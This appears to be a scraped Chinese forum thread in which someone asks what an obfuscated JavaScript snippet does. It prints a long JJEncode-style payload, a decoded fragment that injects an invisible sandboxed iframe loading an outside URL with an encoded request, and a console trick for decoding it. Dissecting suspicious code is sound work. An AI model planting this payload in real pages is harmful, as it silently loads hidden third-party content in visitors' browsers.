\"\\\\\"+$$.__$+$$.___+$$.$$$+\"\\\\\"+$$.__$+$$._$$+$$._$_+$$.__$+$$.$_$$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$.__$+$$.$$_+$$.___+$$.$_$_+\"\\\\\"+$$.__$+$$._$_+$$.$$$+$$.$__$+$$._+\"\\\\\"+$$.__$+$$.__$+$$._$$+\"\\\\\"+$$.__$+$$.___+$$._$$+(![]+\"\")[$$._$_]+$$.$$$+$$.$_$_+\"\\\\\"+$$.__$+$$._$_+$$.$$$+\"\\\\\"+$$.__$+$$._$$+$$.__$+$$._$+$$.$_$_+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+$$.___+$$.$$__+\"\\\\\"+$$.__$+$$.___+$$._$$+$$.$_$+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$.$$$+\"\\\\\"+$$.__$+$$.___+$$.$$_+\"\\\\\"+$$.__$+$$.$_$+$$._$$+$$.$$$_+\"\\\\\"+$$.__$+$$._$_+$$.$$_+\"\\\\\"+$$.__$+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$._$$+$$.__$+\"\\\\\"+$$.__$+$$._$$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+(![]+\"\")[$$._$_]+\"\\\\\"+$$.__$+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.___+$$.$__+$$.___+$$.$__$+\"\\\\\"+$$.__$+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.___+$$.$__+\"\\\\\"+$$.__$+$$._$_+$$.__$+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.$$$_+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$._$$+$$.__$+\"\\\\\"+$$.__$+$$._$_+$$.$$$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+$$._$+$$.$_$_+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+$$.___+$$.$$__+\"\\\\\"+$$.__$+$$.___+$$._$$+$$.$_$+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$$+$$.___+\"\\\\\"+$$.__$+$$.__$+$$.$$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+$$.$_$$+$$._$_+$$.$_$+\"\\\\\"+$$.__$+$$.$$$+$$._$_+\"\\\\\"+$$.__$+$$._$$+$$._$_+\"\\\\\"+$$.__$+$$._$_+$$.$$_+\"\\\\\"+$$.__$+$$._$_+$$._$_+(![]+\"\")[$$._$_]+$$.$$$_+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$.__$+\"\\\\\"+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$.__$+$$.$$$+$$._$$+$$.__$+$$.$__$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+\"\\\\\"+$$.__$+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$._$_+$$.__$+(![]+\"\")[$$._$_]+$$._$+$$.$$_$+\"\\\\\"+$$.__$+$$.__$+$$.___+\"\\\\\"+$$.__$+$$._$_+$$._$_+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.__$+$$.$__+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.__$+$$.$$_+(![]+\"\")[$$._$_]+$$.$_$$+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$._$_+$$.__$+$$._$+$$.$_$$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$._$_+$$.$$_+\"\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$_$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+$$.$$$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$._$$+\"=%\"+$$._$_+$$.$$$+\"));\"+$$.$$__+$$._$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.$$_+$$._$$+$$._$+(![]+\"\")[$$._$_]+$$.$$$_+\".\"+(![]+\"\")[$$._$_]+$$._$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"(%\"+$$._$_+$$.$$$+$$.__$+\"%\"+$$._$_+$$.$$$+\")-%\"+$$._$_+$$.$$$+\"');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$$$+\".\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$_$$+$$._+$$.__+$$.$$$_+\"('\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$$_$+\"',\\\\\"+$$.$__+$$.___+\"'\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$$$$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.__$+\"');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$$$+\".\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$_$$+$$._+$$.__+$$.$$$_+\"('\\\\\"+$$.__$+$$.$_$+$$.___+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$.___+$$.__+\"',\\\\\"+$$.$__+$$.___+\"'\"+$$.$__+$$._$$+$$.___+\"\\\\\"+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$.$$$+$$.___+\"');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$$$+\".\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$_$$+$$._+$$.__+$$.$$$_+\"('\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$._$+(![]+\"\")[$$._$_]+(![]+\"\")[$$._$_]+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"',\\\\\"+$$.$__+$$.___+\"'\\\\\"+$$.__$+$$.$_$+$$.$$_+$$._$+\"');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$$$+\".\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$_$$+$$._+$$.__+$$.$$$_+\"('\\\\\"+$$.__$+$$.$$_+$$._$$+$$.__+\"\\\\\"+$$.__$+$$.$$$+$$.__$+(![]+\"\")[$$._$_]+$$.$$$_+\"',\\\\\"+$$.$__+$$.___+\"'\"+$$._$+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.$_$_+$$.$$__+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.__+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\":\\\\\"+$$.$__+$$.___+$$.___+\";');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$$$+\".\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.__$+$$.__+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+$$.$_$$+$$._+$$.__+$$.$$$_+\"('\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$_$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.$$_$+$$.$_$$+$$._$+\"\\\\\"+$$.__$+$$.$$$+$$.___+\"',\\\\\"+$$.$__+$$.___+\"'\"+$$.$_$_+(![]+\"\")[$$._$_]+(![]+\"\")[$$._$_]+$$._$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"-\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$$__+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.__+\"\\\\\"+$$.__$+$$.$$_+$$._$$+\"\\\\\"+$$.$__+$$.___+$$.$_$_+(![]+\"\")[$$._$_]+(![]+\"\")[$$._$_]+$$._$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"-\"+$$.$$$$+$$._$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+\"\\\\\"+$$.__$+$$.$$_+$$._$$+\"\\\\\"+$$.$__+$$.___+$$.$_$_+(![]+\"\")[$$._$_]+(![]+\"\")[$$._$_]+$$._$+\"\\\\\"+$$.__$+$$.$$_+$$.$$$+\"-\\\\\"+$$.__$+$$.$$_+$$._$$+$$.$_$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$$$_+\"-\"+$$._$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$__+$$.$$$+\"\\\\\"+$$.__$+$$.$_$+$$.__$+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+\"');\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.$$_$+$$._$+$$.$$__+$$._+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.__+\".\\\\\"+$$.__$+$$.$__+$$.$$$+$$.$$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$.$_$+(![]+\"\")[$$._$_]+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$_$+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.__+\"\\\\\"+$$.__$+$$.___+$$._$_+\"\\\\\"+$$.__$+$$.$$$+$$.__$+\"\\\\\"+$$.__$+$$.__$+$$.__$+$$.$$_$+\"('\\\\\"+$$.__$+$$.$$_+$$.$$$+\"\\\\\"+$$.__$+$$.$$_+$$._$_+$$.$_$_+\"\\\\\"+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.$$$_+\"\\\\\"+$$.__$+$$.$$_+$$._$_+\"').\"+$$.$_$_+\"\\\\\"+$$.__$+$$.$$_+$$.___+\"\\\\\"+$$.__$+$$.$$_+$$.___+$$.$$$_+\"\\\\\"+$$.__$+$$.$_$+$$.$$_+$$.$$_$+\"\\\\\"+$$.__$+$$.___+$$._$$+\"\\\\\"+$$.__$+$$.$_$+$$.___+\"\\\\\"+$$.__$+$$.$_$+$$.__$+(![]+\"\")[$$._$_]+$$.$$_$+\"(\"+$$.$$$$+\");\\\\\"+$$.__$+$$._$_+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$.__$+\"\\\\\"+$$.__$+$$._$_+\"})();\"+\"\\\"\")())();</div>"], "reply": "19", "tittle": "请教下这段 JS 什么意思？", "comment": ["var f = document.createElement('iframe');\r", "\t\t\tf.setAttribute('src', '", " … ZVRleHQpO319CgkJCQlodHRwLnNlbmQobnVsbCk7Cgk=%27));console.log(%271%27)-%27');\r", "\t\t\tf.setAttribute('id', 'ifr1');\r", "\t\t\tf.setAttribute('height', '430px');\r", "\t\t\tf.setAttribute('scrolling', 'no');\r", "\t\t\tf.setAttribute('style', 'opacity: 0;');\r", "\t\t\tf.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin');\r", "\t\t\tdocument.getElementById('wrapper').appendChild(f);", "控制台粘贴下列代码即可：\r", "\r", "$$ = ~ [];\r", "$$ = {\r", "    ___: ++$$,\r", "    $$$$: (![] + \"\")[$$],\r", "    __$: ++$$,\r", "    $_$_: (![] + \"\")[$$],\r", "    _$_: ++$$,\r", "    $_$$: ({} + \"\")[$$],\r", "    $$_$: ($$[$$] + \"\")[$$],\r", "    _$$: ++$$,\r", "    $$$_: (!\"\" + \"\")[$$],\r", "    $__: ++$$,\r", "    $_$: ++$$,\r", "    $$__: ({} + \"\")[$$],\r", "    $$_: ++$$,\r", "    $$$: ++$$,\r", "    $___: ++$$,\r", "    $__$: ++$$\r", "};\r", "$$.$_ = ($$.$_ = $$ + \"\")[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + \"\")[$$.__$]) + ((!$$) + \"\")[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = (!\"\" + \"\")[$$.__$]) + ($$._ = (!\"\" + \"\")[$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$;\r", "$$.$$ = $$.$ + (!\"\" + \"\")[$$._$$] + $$.__ + $$._ + $$.$ + $$.$$;\r", "$$.$ = ($$.___)[$$.$_][$$.$_];\r", "\r", "console.log($$.$($$.$$ + \"\\\"\" + \"\\\\\" + $$.__$ + $$.__$ + \"(\" + $$.$$$$ + $$._ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + $$.$$__ + $$.__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + $$._$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.$__ + $$.___ + $$.$_$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + $$._$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$$$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$._$ + $$._ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$$ + \"()\\\\\" + $$.$__ + $$.___ + \"{\\\\\" + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$_ + $$.$_$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + \"\\\\\" + $$.$__ + $$.___ + $$.$$$$ + \"\\\\\" + $$.$__ + $$.___ + \"=\\\\\" + $$.$__ + $$.___ + $$.$$_$ + $$._$ + $$.$$__ + $$._ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + $$.__ + \".\" + $$.$$__ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + $$.$$$_ + $$.$_$_ + $$.__ + $$.$$$_ + \"\\\\\" + $$.__$ + $$.___ + $$.$_$ + (![] + \"\")[$$._$_] + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + $$.__ + \"('\\\\\" + $$.__$ + $$.$_$ + $$.__$ + $$.$$$$ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + $$.$_$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$.$$$_ + \"');\\\\\" + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$$$ + \".\\\\\" + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + $$.__ + \"\\\\\" + $$.__$ + $$.___ + $$.__$ + $$.__ + $$.__ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + $$.$_$$ + $$._ + $$.__ + $$.$$$_ + \"('\\\\\" + $$.__$ + $$.$$_ + $$._$$ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + $$.$$__ + \"',\\\\\" + $$.$__ + $$.___ + \"'\\\\\" + $$.__$ + $$.$_$ + $$.___ + $$.__ + $$.__ + \"\\\\\" + $$.__$ + $$.$$_ + $$.___ + \"://\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \".\" + $$.$$$$ + (![] + \"\")[$$._$_] + $$.$_$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + (![] + \"\")[$$._$_] + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$__ + $$.$$$ + $$._$ + \".\" + $$.$$__ + $$._$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"/\" + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$$ + \"/\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + (![] + \"\")[$$._$_] + $$.$$$_ + $$.$_$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$__ + $$.$$$ + \"?\" + $$._$ + $$.$$$$ + $$.$$$$ + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + \"=\" + $$._$_ + $$._$$ + $$._$$ + \"&\\\\\" + $$.__$ + $$.$$_ + $$.___ + $$.$_$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + $$.__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + \"_\\\\\" + $$.__$ + $$.$_$ + $$.__$ + $$.$$_$ + \"=%\" + $$._$_ + $$.$$$ + \"%\" + $$._$$ + \"\\\\\" + $$.__$ + $$.___ + $$.$_$ + \"%\" + $$._$$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$$ + $$.$$__ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.___ + $$.__ + \"%\" + $$._$_ + $$.___ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$$ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$_ + $$.$$__ + \"=\" + $$.$$_$ + $$.$_$_ + $$.__ + $$.$_$_ + \":%\" + $$._$_ + $$.$$_ + $$.$$__ + $$._$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$.$_$_ + \";\" + $$.$$$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$_ + $$.$_$_ + (![] + \"\")[$$._$_] + \"(\" + $$.$_$_ + $$.__ + $$._$ + $$.$_$$ + \"(%\" + $$._$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$.$__ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$._$$ + \"\\\\\" + $$.__$ + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$._$_ + $$.__$ + (![] + \"\")[$$._$_] + $$._$ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.___ + $$.$__ + $$.___ + \"\\\\\" + $$.__$ + $$.$__ + $$.$$$ + $$.$_$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$_ + $$._$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.___ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$__ + \"\\\\\" + $$.__$ + $$.___ + $$.$_$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.___ + $$.___ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + \"\\\\\" + $$.__$ + $$.___ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + $$._$$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$$ + $$.___ + \"\\\\\" + $$.__$ + $$.___ + $$.$$_ + $$.__$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$$ + $$.___ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$_ + $$.___ + \"\\\\\" + $$.__$ + $$.__$ + $$._$$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$._$$ + $$.$$$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$.$__ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$._$$ + \"\\\\\" + $$.__$ + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$._$_ + $$.__$ + (![] + \"\")[$$._$_] + $$._$ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$.$__$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + $$.$__ + $$._$ + \"\\\\\" + $$.__$ + $$.__$ + $$._$_ + $$._$_ + $$.$$_$ + (![] + \"\")[$$._$_] + $$.$$_$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + $$.$$__ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + $$.$$_$ + $$._$ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + $$.$___ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$_ + $$.$$_$ + $$._$$ + $$.$$_$ + $$._$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$$ + $$.__$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$._$$ + $$.__$ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.$$$ + $$._$_ + \"\\\\\" + $$.__$ + $$.__$ + $$.$__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$.___ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$$ + \"\\\\\" + $$.__$ + $$._$_ + $$.$_$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$_ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$__ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$$ + $$.___ + \"\\\\\" + $$.__$ + $$.$$_ + $$.___ + \"\\\\\" + $$.__$ + $$._$$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.__$ + $$.$__$ + \"\\\\\" + $$.__$ + $$.$$_ + $$._$$ + $$.$_$$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.___ + $$.$__ + \"\\\\\" + $$.__$ + $$.___ + $$.__$ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$_ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$$ + $$.$___ + $$._ + $$.$$__ + \"\\\\\" + $$.__$ + $$.___ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.___ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$$ + $$.__$ + \"\\\\\" + $$.__$ + $$.$_$ + $$._$$ + $$.$$$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$.$__ + $$.$$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$._$$ + \"\\\\\" + $$.__$ + $$.__$ + $$._$_ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + \"\\\\\" + $$.__$ + $$._$_ + $$.__$ + (![] + \"\")[$$._$_] + $$._$ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + \"\\\\\" + $$.__$ + $$._$_ + $$._$_ + \"\\\\\" + $$.__$ + $$.$$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + $$.$__$ + $$._ + $$.$$__ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$_ + \"\\\\\" + $$.__$ + $$.$_$ + $$.___ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$.__$ + $$.___ + (![] + \"\")[$$._$_] + \"\\\\\" + $$.__$ + $$.$$$ + $$._$_ + $$.$$_$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$_ + $$.___ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$_ + $$._$ + \"\\\\\" + $$.__$ + $$._$$ + $$.__$ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$$_ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + \"\\\\\" + $$.__$ + $$._$_ + $$._$$ + \"\\\\\" + $$.__$ + $$.___ + $$.__$ + $$.$__$ + \"\\\\\" + $$.__$ + $$.__$ + $$.__$ + \"\\\\\" + $$.__$ + $$.___ + $$.$$$ + \"\\\\\" + $$.__$ + $$._$$ + $$._$_ + $$.__$ + $$.$_$$ + \"\\\\\" + $$.__$ + $$.$_$ + $$.$_$ + \"\\\\\" + $$.__$ + $$.__$ + $$.$$_ + $$.___ + $$.$_$_ + \"\\\\\" + $$.__$ + $$._$_ + $$.$$$ + $$.$__$ + $$._ + \"\\\\\" + $$.__$ + $$.__$ + $$._$$ + \"\\\\\" + $$.__$ + $$.___ + $$._$$ + (![] + \"\")[$$._$_] + $$.$$$ + $$.$_$_ + 